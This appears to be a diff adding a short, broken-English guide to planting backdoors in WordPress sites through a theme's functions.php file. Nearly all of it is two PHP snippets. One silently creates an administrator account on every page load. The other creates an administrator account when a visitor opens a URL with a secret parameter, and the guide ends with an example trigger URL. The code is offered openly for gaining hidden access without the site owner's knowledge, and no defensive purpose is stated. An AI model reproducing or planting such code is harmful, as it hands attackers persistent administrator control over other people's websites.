@@ -1,0 +1,44 @@
+Back Door ?
+
+It's a system weak password and configuration error.
+We can add backdoor in different website in absence of admin.
+Push functions.php
+Next time backdoor  user id and password automatically generate.
+This hacker access system.
+
+
+01 (add to theme functions.php)
+
+function wpb_admin_account(){
+$user = ‘minhaz’;
+$pass = ‘pass’;
+$email = ’email@email.em’;
+if ( !username_exists( $user ) && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( ‘administrator’ );
+}
+}
+add_action(‘init’,’wpb_admin_account’);
+
+
+
+
+02 (add to theme functions.php)
+
+<?php
+add_action(‘wp_head’, ‘WordPress_backdoor’);
+
+function WordPress_backdoor() {
+If ($_GET[‘backdoor’] == ‘go’) {
+require(‘wp-includes/registration.php’);
+If (!username_exists(‘backdooradmin’)) {
+$user_id = wp_create_user(‘backdooradmin’, ‘Pa55W0rd’);
+$user = new WP_User($user_id);
+$user->set_role(‘administrator’);
+}
+}
+}
+?>
+
+https://www.targetdomain.com?backdoor=go
